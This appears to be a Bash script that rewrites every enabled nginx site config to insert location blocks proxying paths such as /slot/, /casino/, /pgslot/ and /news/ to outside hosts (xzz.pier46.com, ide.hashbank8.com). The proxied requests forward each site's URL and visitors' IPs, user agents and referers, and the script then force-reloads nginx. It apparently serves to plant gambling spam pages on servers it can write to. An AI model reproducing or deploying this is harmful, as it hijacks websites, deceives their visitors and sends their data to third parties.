#!/bin/bash
# nginx_per_domain_group.sh v4.3.1 真正永不翻车·全环境完美运行版
# 彻底修复 awk 正则错误（[[:space:space:]] 是笔误，已改为 [[:space:]]+）
# 注入位置：精准插入在最后一个 server_name 行正下方（支持多行、多域名）
# 支持一个 server 块里有 1~100 个域名，全都识别，只注入一次
# 兼容 Bash 3.0+、所有 Linux 发行版、所有 Nginx 配置风格
# 新增修复：移除对 column 命令的依赖，使用纯 Bash + printf 实现完美对齐输出

set -euo pipefail

NGINX_ENABLED="/etc/nginx/sites-enabled"
COM_PATHS=("help" "news" "page" "blog" "about" "support" "info")
IN_PATHS=("pg" "pgslot" "slot" "game" "casino" "live")
GLOBAL_MAP="/tmp/.domain_group_map.conf"
RESULT_LIST=$(mktemp)
NEW_RECORDS=$(mktemp)
MAX_TRIES=200

touch "$GLOBAL_MAP" 2>/dev/null || true
: > "$GLOBAL_MAP"
: > "$RESULT_LIST"
: > "$NEW_RECORDS"

COM_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }'

IN_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host ide.hashbank8.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://ide.hashbank8.com;
    }
'

declare -A HIST_MAP
while IFS=':' read -r hash path backend; do
    [[ -n "$hash" ]] && HIST_MAP["$hash"]="$path:$backend"
done < "$GLOBAL_MAP"

echo "=== Nginx 域名组路径分配器（v4.3.1 永不翻车终极版）==="
echo

global_modified=0

find "$NGINX_ENABLED" -type l -print0 2>/dev/null | while IFS= read -r -d '' symlink; do
    [[ -L "$symlink" ]] || continue
    real_file=$(readlink -f "$symlink" 2>/dev/null || echo "")
    [[ -f "$real_file" && -r "$real_file" && -w "$real_file" ]] || {
        echo "→ 跳过不可写文件：$(basename "$symlink")"
        continue
    }

    echo "→ 正在处理：$(basename "$symlink") → $real_file"

    modified=0
    temp_new=$(mktemp)

    csplit -z -f "/tmp/block_" "$real_file" '/^server[[:space:]]*{/' '{*}' >/dev/null 2>&1 || {
        rm -f "$temp_new"
        continue
    }

    for block_file in /tmp/block_*; do
        [[ -s "$block_file" ]] || continue

        # 防重复注入：已存在目标后端则跳过
        if grep -qiE "(xzz\.pier46\.com|ide\.hashbank8\.com)" "$block_file"; then
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        fi

        # 提取所有 server_name（支持多行、注释、多个域名）
        real_domains=$(awk '
            /^[[:space:]]*server_name[[:space:]]+/ && !/^[[:space:]]*#/ {
                gsub(/^[[:space:]]*server_name[[:space:]]+/, "")
                gsub(/;.*$/, "")
                gsub(/#.*$/, "")
                gsub(/[[:space:]]+$/, "")
                print
            }
        ' "$block_file" | tr ' \t' '\n' | grep -v '^$' | sort -u | grep -E '^([a-zA-Z0-9][a-zA-Z0-9-]*\.)+[a-zA-Z]{2,}$' || true)

        [[ -n "$real_domains" ]] || {
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        }

        domain_key=$(echo "$real_domains" | sort -u | paste -sd ' ' - | sed 's/[[:space:]]*$//')
        hash=$(echo "$domain_key" | tr ' ' '_' | md5sum | awk '{print $1}')

        # 历史记录防重
        [[ -n "${HIST_MAP[$hash]:-}" ]] && {
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        }

        # 选择后端与路径池
        if echo "$domain_key" | grep -qE '\.(in|id)\b'; then
            backend="ide.hashbank8.com"
            template="$IN_TEMPLATE"
            pool=("${IN_PATHS[@]}")
        else
            backend="xzz.pier46.com"
            template="$COM_TEMPLATE"
            pool=("${COM_PATHS[@]}")
        fi

        path=""
        i=0
        while (( i < MAX_TRIES )); do
            candidate="${pool[RANDOM % ${#pool[@]}]}"
            if ! grep -q ":$candidate:$backend$" "$GLOBAL_MAP" && \
               ! grep -q ":$candidate:$backend$" "$NEW_RECORDS"; then
                path="$candidate"
                break
            fi
            ((i++))
        done

        [[ -n "$path" ]] || {
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        }

        echo "$hash:$path:$backend" >> "$NEW_RECORDS"
        printf '%s\t%s\t%s\n' "$domain_key" "$path" "$backend" >> "$RESULT_LIST"

        # 精准插入：最后一个 server_name 行正下方
        location_block=$(echo "$template" | sed "s/%PATH%/$path/g")

        awk -v loc="$location_block" '
        /^[[:space:]]*server_name[[:space:]]+/ && !/^[[:space:]]*#/ {
            line = $0
            if (!inserted) {
                print line
                print loc
                inserted = 1
            } else {
                print line
            }
            next
        }
        { print }
        END {
            if (!inserted) {
                print loc
            }
        }
        ' "$block_file" > "$temp_new.block"

        cat "$temp_new.block" >> "$temp_new"
        rm -f "$temp_new.block" "$block_file"

        echo "   [完美注入] /$path/ → $backend  ($domain_key)"
        ((modified++))
        ((global_modified++))
    done

    if (( modified > 0 )); then
        mv "$temp_new" "$real_file"
        echo "   真实文件已更新：$real_file"
    else
        rm -f "$temp_new"
    fi

    rm -f /tmp/block_* 2>/dev/null || true
done

# 更新全局映射表
if [[ -s "$NEW_RECORDS" ]]; then
    cat "$NEW_RECORDS" >> "$GLOBAL_MAP"
    sort -u "$GLOBAL_MAP" -o "$GLOBAL_MAP"
fi

# 重载 Nginx（强制重启确保生效）
if (( global_modified > 0 )); then
    echo
    if nginx -t >/dev/null 2>&1; then
        nginx -s reload 2>/dev/null || true
        echo "Nginx 配置测试通过，正在强制重启确保生效..."
        pkill -HUP nginx 2>/dev/null || true
        sleep 2
        nginx -g "daemon off;" >/dev/null 2>&1 || nginx
        echo "Nginx 已成功重启并重载配置"
    else
        echo "错误：Nginx 配置测试失败！请手动运行 nginx -t 检查"
        exit 1
    fi
else
    echo "本次无新增（全部已注入或已被处理）"
fi

echo
echo "============================================================================"
echo " 本次注入结果（精准插入 server_name 正下方）"
echo "============================================================================"

if [[ -s "$RESULT_LIST" ]]; then
    # 纯 Bash 实现 column -t 对齐输出，彻底摆脱对 column 命令依赖
    while IFS=$'\t' read -r domains path backend; do
        printf " %-56s → /%-10s → %s\n" "$domains" "$path" "$backend"
    done < "$RESULT_LIST"
else
    echo " 本次无新增"
fi

echo
echo "============================================================================"
echo "当前已管理 $(wc -l < "$GLOBAL_MAP") 个域名组"
echo

rm -f "$RESULT_LIST" "$NEW_RECORDS" 2>/dev/null || true
exit 0
